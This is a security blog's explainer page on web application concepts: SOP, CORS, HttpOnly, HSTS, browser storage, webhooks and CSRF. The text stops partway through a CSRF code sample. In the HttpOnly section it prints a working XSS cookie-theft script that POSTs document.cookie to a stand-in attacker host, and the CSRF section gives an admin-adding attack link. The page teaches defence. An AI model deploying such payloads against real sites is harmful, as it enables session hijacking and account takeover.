<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Web Applications - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    

    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-dfir üîç">
      <a href="/docs/dfir">
        <span>DFIR üîç</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-reverse üîß">
      <a href="/docs/reverse">
        <span>Reverse üîß</span>
      </a>
    </li>
    
    <li class="menu-item-toolkit üß∞">
      <a href="/docs/toolkit">
        <span>Toolkit üß∞</span>
      </a>
    </li>
    
    <li class="menu-item-threat hunting ü™§">
      <a href="/docs/thunting">
        <span>Threat Hunting ü™§</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tech reference üìö">
      <a href="/docs/reference">
        <span>Tech Reference üìö</span>
      </a>
    </li>
    
  </ul>
</div>
    
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
    
    <div style="margin-left: 20pt;">
      <a href="/index.xml" type="application/rss+xml">
        <img src="/images/rss.png" alt="RSS Feed">
      </a>
    </div>
    
    <style>
      a[href="/index.xml"] {
        display: inline-block;
        vertical-align: middle;
        margin-right: 10px;
      }
    
      a[href="/index.xml"] img {
        height: 30px;
      }
    </style>
    
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/dfir/attacks/applications/"> üëàüèº Back to </br> Application Attacks </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#sop-vs-cors">SOP vs CORS</a>
      <ul>
        <li><a href="#sop">SOP</a></li>
        <li><a href="#relax-sop">Relax, SOP&hellip;</a></li>
        <li><a href="#cors">CORS</a></li>
        <li><a href="#httponly"><code>httpOnly</code></a></li>
      </ul>
    </li>
    <li><a href="#hsts">HSTS</a></li>
    <li><a href="#certificate-transparency-ct">Certificate Transparency (CT)</a></li>
    <li><a href="#cookies">Cookies</a></li>
    <li><a href="#server-client-conversation-types">Server-Client Conversation Types</a>
      <ul>
        <li><a href="#long-polling">Long-Polling</a></li>
        <li><a href="#websockets">WebSockets</a></li>
        <li><a href="#server-sent-events">Server-Sent Events</a></li>
        <li><a href="#webhook">WebHook</a></li>
      </ul>
    </li>
    <li><a href="#backpressure">Backpressure</a></li>
    <li><a href="#csrf">CSRF</a>
      <ul>
        <li><a href="#csrf-token">CSRF Token</a></li>
        <li><a href="#samesite">SameSite</a></li>
        <li><a href="#referer-based-validation">Referer-based validation</a></li>
      </ul>
    </li>
    <li><a href="#xss">XSS</a>
      <ul>
        <li><a href="#reflected">Reflected</a></li>
        <li><a href="#stored">Stored</a></li>
        <li><a href="#dom">DOM</a></li>
        <li><a href="#-beef">üõ† BeEF</a></li>
      </ul>
    </li>
    <li><a href="#sqli">SQLi</a></li>
    <li><a href="#directory-traversal">Directory Traversal</a></li>
    <li><a href="#get-vs-post">GET vs POST</a></li>
    <li><a href="#ioc--investigation-tips">IoC &amp; Investigation Tips</a>
      <ul>
        <li><a href="#sqli-1">SQLi</a>
          <ul>
            <li><a href="#-detections">üö® Detections</a></li>
            <li><a href="#-payloads-iocs">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#xxs">XXS</a>
          <ul>
            <li><a href="#-payloads-iocs-1">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-1">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#xxe">XXE</a></li>
        <li><a href="#-payloads-iocs-2">‚öôÔ∏è Payloads IoCs</a>
          <ul>
            <li><a href="#-tools-iocs-2">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#cmdi">CMDi</a>
          <ul>
            <li><a href="#-payloads-iocs-3">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-3">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#idor">IDOR</a>
          <ul>
            <li><a href="#-payloads-iocs-4">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-4">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#html-injection">HTML Injection</a></li>
        <li><a href="#ognl">OGNL</a>
          <ul>
            <li><a href="#-payloads-iocs-5">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-5">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#botnets">Botnets</a></li>
        <li><a href="#dirbusting">Dirbusting</a>
          <ul>
            <li><a href="#-payloads-iocs-6">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-6">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#fuzzing">Fuzzing</a>
          <ul>
            <li><a href="#-payloads-iocs-7">‚öôÔ∏è Payloads IoCs</a></li>
            <li><a href="#-tools-iocs-7">üõ† Tools IoCs</a></li>
          </ul>
        </li>
        <li><a href="#swiss-knives-frameworks-and-other-tools-ioc">Swiss Knives, Frameworks and Other Tools&rsquo; IoC</a>
          <ul>
            <li><a href="#burp">Burp</a></li>
            <li><a href="#metasploit">Metasploit</a></li>
            <li><a href="#postman">Postman</a></li>
          </ul>
        </li>
        <li><a href="#ssrf">SSRF</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
 </aside>
</div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">Web Applications</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      

      
      

      
    </div>
    
    <b>Created:</b> 28.07.2022
    <br />

    

  </header>


  <div class="content" itemprop="articleBody">
    <p><em>This is about &hellip; .</em></p>
<h2 id="sop-vs-cors">SOP vs CORS</h2>
<p><img src="images/anakin-vs-obivan.jpg" alt="img"></p>
<h3 id="sop">SOP</h3>
<p>Basically, SOP says &ldquo;You can&rsquo;t manipulate resources belonging to other websites, you must remain here at all times. Play with your toys only&rdquo;. It is some sort of a sandbox.</p>
<p>Let&rsquo;s have a look at an example. Let&rsquo;s take two websites: <code>bakerst221b.com</code> and <code>richmond65a.com</code>. The javascript on <code>bakerst221b.com</code> wants to have access to something on <code>richmond65a.com</code>. What does it have access to and what does it not have access to?</p>
<ol>
<li><strong>Cookies</strong> üç™ -&gt; NO!!! Cookies are like temp keys. While temporary, these are still keys which can be used to open doors. Once the door is open, all sorts of nasty stuff can happen and we don&rsquo;t want that. That&rsquo;s the whole point why SOP was created in the first place. ‚ùóÔ∏èFor the usability purposes, cookies can be accessed by other subdomains although it might pose some risks. In order to partially mitigate it, use <code>HttpOnly</code> flag when creating a cookie.</li>
<li><strong>Videos</strong> üé•.</li>
<li><strong>Pictures</strong> üåá.</li>
<li><strong>Another script</strong> üìù.</li>
</ol>
<p><img src="images/sop1.png" alt="img"></p>
<p>Ok. The website <a href="https://bakerst221b.com">https://bakerst221b.com</a> can have videos, pictires and sctipts from the richmond website loaded on its page.</p>
<p><img src="images/sop2.png" alt="img"></p>
<p>But what&rsquo;s interesting, it still can&rsquo;t ACCESS them.</p>
<p><img src="images/sop3.png" alt="img"></p>
<h3 id="relax-sop">Relax, SOP&hellip;</h3>
<ol>
<li>Cookies can be accessed by subdomains (unless <code>HttpOnly</code> is set)</li>
<li><code>document.domain</code> is set to the same domain to show the browser it&rsquo;s ok, but only if both are parts of the same FQDN.</li>
<li>CORS.</li>
</ol>
<p>DNS rebinding attack effectively circumvents the SOP. Read more in the <code>protocols -&gt; ASP -&gt; DNS</code> article.</p>
<h3 id="cors">CORS</h3>
<p>What fun would it be if the rules didn&rsquo;t have some exceptions? CORS is basically as way to circumvent overly strict SOP and allow something to be accessed cross-origin.</p>
<p>When seeing some cross-origin request, user&rsquo;s browser first sends a preflight request to check if it&rsquo;s allowed to do so. And here is the biggest trick. There are simple and &ldquo;complex&rdquo; requests. When something happens WITHOUT javascript (html only), the requests generated are ALWAYS simple. That means that without javascript code one CAN&rsquo;T make a non-simple request. What do I call non-simple? Let&rsquo;s start with what&rsquo;s simple first.</p>
<ol>
<li><strong>Methods</strong>: <code>GET</code>, <code>HEAD</code> and <code>POST</code></li>
<li><strong>Headers</strong>: no custom headers (including those starting with <code>X-</code>)</li>
<li><strong>Content type</strong>: <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>.</li>
</ol>
<p>Note that ALL of the requierements above need to be satisfied. Non-simple are basically everything <strong>else</strong>. The reason why simple requests do not require a preflights is because they relatively safe. Since you can&rsquo;t set headers, change content-type or use other methods from plain html, and the request is constructed automatically by the browser, it&rsquo;s relatively safe. You might ask if cookies are sent this way.</p>
<p>The most important header is <code>Access-Control-Allow-Origin</code>, it says which origins can make the cross-origin requests. Another header to be mindful is <code>Access-Control-Allow-Credentials</code>, when set to <code>true</code>.</p>
<p>Here is an example of the request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">OPTIONS /api/resource HTTP/1.1
</span></span><span class="line"><span class="cl">Host: example-server.com
</span></span><span class="line"><span class="cl">Origin: https://example-client.com
</span></span><span class="line"><span class="cl">Access-Control-Request-Method: PUT
</span></span><span class="line"><span class="cl">Access-Control-Request-Headers: X-Auth-Token
</span></span></code></pre></div><p>In the response, the server will tell the broser what&rsquo;s allowed and what&rsquo;s not:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Access-Control-Allow-Origin: https://example-client.com
</span></span><span class="line"><span class="cl">Access-Control-Allow-Methods: PUT, POST, GET, OPTIONS
</span></span><span class="line"><span class="cl">Access-Control-Allow-Headers: X-Auth-Token
</span></span><span class="line"><span class="cl">Access-Control-Max-Age: <span class="m">86400</span>
</span></span></code></pre></div><p>Say, I have a website <code>bakerst22b_evil.com</code>. On my website there is a link to richmond64.com. When the user clicks the link, it doesn&rsquo;t initiate CORS. However, this is a cross origin request. If <code>richmond64.com</code> has a CSRF there, it might be exploited. CORS won&rsquo;t protect from that.</p>
<p>Another scenario. On my website <code>bakerst22b_evil.com</code> there is a javascript code that want&rsquo;s to access a <code>richmond64.com</code> cookie üç™. It won&rsquo;t be able to because the user&rsquo;s browser won&rsquo;t allow it. The only way that <code>bakerst22b_evil.com</code> could access it, is if <code>richmond64.com</code> set its CORS header to the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Access-Control-Allow-Origin: * <span class="c1"># or</span>
</span></span><span class="line"><span class="cl">Access-Control-Allow-Origin: bakerst22b_evil.com <span class="c1"># or</span>
</span></span><span class="line"><span class="cl">Access-Control-Allow-Credentials: <span class="nb">true</span>
</span></span></code></pre></div><h3 id="httponly"><code>httpOnly</code></h3>
<p>When a client connects to a server, a server sets the cookie required to track the user&rsquo;s activity and identify them with the following header:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Set-Cookie: <span class="nv">sessionId</span><span class="o">=</span>abc123<span class="p">;</span> HttpOnly
</span></span></code></pre></div><p>Do you remember how we talked about SOP and how javasctipt can&rsquo;t access cookies from other website&rsquo;s? Well, this flag makes it impossible for javascript to access cookies for ITS OWN website! Why? To protect from XSS.</p>
<p>Say, <a href="https://richmond64.com">https://richmond64.com</a> has a stored XSS vulnerability. One can just embed the following code to send cookies for the website whenever they wanted:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getCookies</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">cookieArray</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">cookieArray</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">cookieArray</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="p">[</span><span class="nx">name</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">cookies</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">cookies</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">sendCookies</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="nx">getCookies</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="kd">let</span> <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://bakerst221b_evil.com&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">cookies</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Cookies sent successfully&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Failed to send cookies&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">sendCookies</span><span class="p">();</span>
</span></span></code></pre></div><p>When the client visits the website with this code, all cookies belonging to the <a href="https://richmond64.com">https://richmond64.com</a> origin are sent over to <a href="https://bakerst221b_evil.com">https://bakerst221b_evil.com</a>. With <code>httpOnly</code> flag the javascript won&rsquo;t be able to do that. So, even if there were an XSS, the cookies would not be stolen.</p>
<h2 id="hsts">HSTS</h2>
<p><code>Strict-Transport-Security</code> header is sent forcing the browser only use HTTPS and preventing any requests coming via HTTP.</p>
<h2 id="certificate-transparency-ct">Certificate Transparency (CT)</h2>
<p>CA issues certificates and maintains a log with all the certificates issued. This log is available online and helps:</p>
<ol>
<li>Detect misissued certificates, which may be a result of CA compromise or misconfiguration.</li>
<li>Identify rogue CAs that are issuing certificates without proper authorization.</li>
<li>Increase the overall trust in the SSL/TLS ecosystem by providing transparency and accountability.</li>
</ol>
<h2 id="cookies">Cookies</h2>
<p>If you hit F12 in your browser and go to Application tab (applicable to Chrome), you will see a handful of things there. But there are three things I would like to talk about just now: local storage, session storage and cookies. Cookies and sessions identifiers can be stored in either of the three, but they are usually stored in the Cookie storage. However, that means that unless we have some additional settings in place, they will sent with any request to our website, and as we know from the CSRF section below, that&rsquo;s not always a good thing.</p>
<p><img src="images/browser-stash.png" alt="img"></p>
<p>Local Storage, Session Storage, and Cookies are all client-side storage options used to store data in a user&rsquo;s browser.</p>
<ol>
<li>Local Storage:</li>
</ol>
<ul>
<li>It is used to store data without an expiration time.</li>
<li>Data stored in Local Storage will persist even after the browser is closed and reopened.</li>
<li>It has a storage capacity of about 5-10 MB per domain.</li>
<li>To access Local Storage in JavaScript, use the following methods:
<ul>
<li><code>localStorage.setItem('key', 'value')</code> to set a value.</li>
<li><code>localStorage.getItem('key')</code> to get a value.</li>
<li><code>localStorage.removeItem('key')</code> to remove a value.</li>
<li><code>localStorage.clear()</code> to clear all data.</li>
</ul>
</li>
</ul>
<ol start="2">
<li>Session Storage:</li>
</ol>
<ul>
<li>It is used to store data for the duration of a single browser session.</li>
<li>Data stored in Session Storage will be cleared when the browser is closed or the session ends.</li>
<li>It has a storage capacity of about 5-10 MB per domain.</li>
<li>To access Session Storage in JavaScript, use the following methods:
<ul>
<li><code>sessionStorage.setItem('key', 'value')</code> to set a value.</li>
<li><code>sessionStorage.getItem('key')</code> to get a value.</li>
<li><code>sessionStorage.removeItem('key')</code> to remove a value.</li>
<li><code>sessionStorage.clear()</code> to clear all data.</li>
</ul>
</li>
</ul>
<ol start="3">
<li>Cookies:</li>
</ol>
<ul>
<li>They are used to store small pieces of data (typically up to 4 KB) with an expiration time.</li>
<li>Cookies are sent to the server with every HTTP request, making them suitable for authentication and user preferences.</li>
<li>To access Cookies in JavaScript, use the following methods:
<ul>
<li>Set a cookie: <code>document.cookie = 'key=value; expires=...; path=...; domain=...; Secure; SameSite=...;'</code></li>
<li>Get all cookies: <code>var allCookies = document.cookie;</code></li>
<li>To delete a cookie, set its expiration date to a past date.</li>
</ul>
</li>
</ul>
<p>The main differences between these storage options are their persistence, capacity, and whether they are sent to the server with each request. Choose the appropriate storage type depending on the specific requirements of your application.</p>
<h2 id="server-client-conversation-types">Server-Client Conversation Types</h2>
<h3 id="long-polling">Long-Polling</h3>
<h3 id="websockets">WebSockets</h3>
<h3 id="server-sent-events">Server-Sent Events</h3>
<h3 id="webhook">WebHook</h3>
<p>A webhook is an HTTP request, triggered by an event in a source system and sent to a destination system, often with a payload of data. Webhooks are automated, in other words they are automatically sent out when their event is fired in the source system.</p>
<p>Let‚Äôs build an analogy.</p>
<p>Imagine a fisher üé£ has cast a fishing line and now is waitng for a fish to bite. How does the fisher know that this <em>event</em> has occured? Well, he feels the fishing line to get strained and the float to move across the surface. Now, once our fisher has received those signals, he can act upon them. That&rsquo;s pretty much it.</p>
<p>I would like to show an example more technical than the above üòÇ. One of the usages could be to send logs or notifications to a remote machine.</p>
<p>For example, you have a Incident Management service (OpsGenie, for example) and you&rsquo;d like to connect it to Elastic SIEM, meaning that you&rsquo;d like any alerts coming from SIEM go directly to OpsGenie. Who&rsquo;s the fisher here? Well, OpsGenie is the fisher, SIEM is the pond and each event is a fish üêü &hellip; or not a fish.</p>
<p><img src="https://media.giphy.com/media/7kJ926qjkxFx6/giphy.gif" alt="img"></p>
<p>The easiest way, of course, is when there are available pre-built integrations that would ease the process. For example, for Elastic SIEM there is X-Pack Alerting (in OpsGenie go to <code>Settings -&gt; Integrations -&gt; X-Pack Alerting</code>). There are lot of complicated fields but there are just a few essential ones. First and foremost copy the code snippet at the beginning, in the Settings section:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;opsgenie&#34;</span> <span class="err">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;webhook&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;scheme&#34;</span> <span class="p">:</span> <span class="s2">&#34;https&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;method&#34;</span> <span class="p">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;host&#34;</span> <span class="p">:</span> <span class="s2">&#34;api.opsgenie.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;port&#34;</span> <span class="p">:</span> <span class="mi">443</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;path&#34;</span> <span class="p">:</span> <span class="s2">&#34;/v1/json/eswatcher&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;headers&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;Content-Type&#34;</span> <span class="p">:</span> <span class="s2">&#34;application/json&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;params&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;apiKey&#34;</span><span class="p">:</span> <span class="s2">&#34;üîë&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;body&#34;</span> <span class="p">:</span> <span class="s2">&#34;{{#toJson}}ctx{{/toJson}}&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>API key üîë is generated by the integration. You can&rsquo;t generate the key üîë yourself in API management section. It won&rsquo;t work with the integration and besides, you can&rsquo;t paste anything in this field. You can only regenerate the üîë.</p>
<p>Now, time to go to Elastic now. There are two ways to make this work.</p>
<ul>
<li><strong>Option 1</strong>. X-Pack API key + Elastic WebHook Connector + Rules
<ul>
<li>üßû Get OpsGenie API key and turn X-Pack on (fisher sits at the pond)</li>
<li>üèãüèº‚Äç‚ôÇÔ∏è Configure the Connector in Elastic (set up a fishing line)</li>
<li>üèãüèº‚Äç‚ôÇÔ∏è Configure Elastic Rules (get the appropriate bait for the fish)</li>
</ul>
</li>
<li><strong>Option 2</strong>. X-Pack (OpsGenie) + Watcher (Elastic)
<ul>
<li>üßû Get OpsGenie API key and turn X-Pack on (fisher sits at the pond)</li>
<li>üèãüèº‚Äç‚ôÇÔ∏è Configure Watcher in Elastic (set up a fishing line and get the appropriate bait for the fish)</li>
<li>üßû Set-up X-Pack in OpsGenie</li>
</ul>
</li>
</ul>
<p>Message. You obviously need to deine what message would look like. The default one is: <code>[X-Pack Alerting] {{watchId}} is triggered. Total Hits: {{totalHits}}</code>. Optionally, you can configure the filter if you don&rsquo;t want to receive all the events.</p>
<p>When all the settings are done, click <code>Enabled</code> to set all up and running.</p>
<p>Another example to see would be some open-source k8s cluster watcher <a href="https://gist.github.com/coffeesn0b/df8da51aefc04e25de896a598723cf5d">here</a>.</p>
<h2 id="backpressure">Backpressure</h2>
<h2 id="csrf">CSRF</h2>
<p>Three conditions need to be met in order to CSRF to work:</p>
<ol>
<li>The website neeeds to have some request that CHANGES things. Simple read-only GET requests are of no use to the attacker. It can be something like password change, admin changes, adding users etc.</li>
<li>The legitimacy of the requests are determined by one or more cookies üç™ in the <code>Cookies</code> header. No other mechanism is involed in this. It also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.</li>
<li>There are no additional parameters that the attacker needs to guess. For the password reset, it could be for example, current password.</li>
</ol>
<h3 id="csrf-token">CSRF Token</h3>
<p>Suppose we have a page on <a href="https://bakerst221b_evil.com">https://bakerst221b_evil.com</a>, and there is a link like <a href="https://richmond.com/admin/add?name=evil&amp;password=master">https://richmond.com/admin/add?name=evil&amp;password=master</a> (richmond.com is vulnerable to CSRF). What happens is that the browser will open this page with the credentials belonging to Richmond, and if there is a valid session, the action above will be executed.</p>
<p>How does a CSRF token protect against CSRF? Remember that a request is considered simple only when all conditions are met (GET/POST/HEAD and no custom headers and content type is a form or text). But what is a CSRF token? It&rsquo;s a random value passed in a custom header (something like X-CSRF-token). Now, if the server requires this custom header to be present, one cannot use just HTML to craft a request. Clicking on a link like <a href="https://richmond.com/admin/add?name=evil&amp;password=master">https://richmond.com/admin/add?name=evil&amp;password=master</a> will not result in a request with a custom header since it&rsquo;s CUSTOM, and the browser only sends what is NOT custom, but rather what&rsquo;s usual. Now, the attacking script on <a href="https://bakerst221b_evil.com">https://bakerst221b_evil.com</a> would have to embed JavaScript to add a custom header, something like the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;https://richmond64.com/api/data&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Add a custom header
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;X-Custom-Header&#39;</span><span class="p">,</span> <span class="s1">&#39;my-custom-value&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
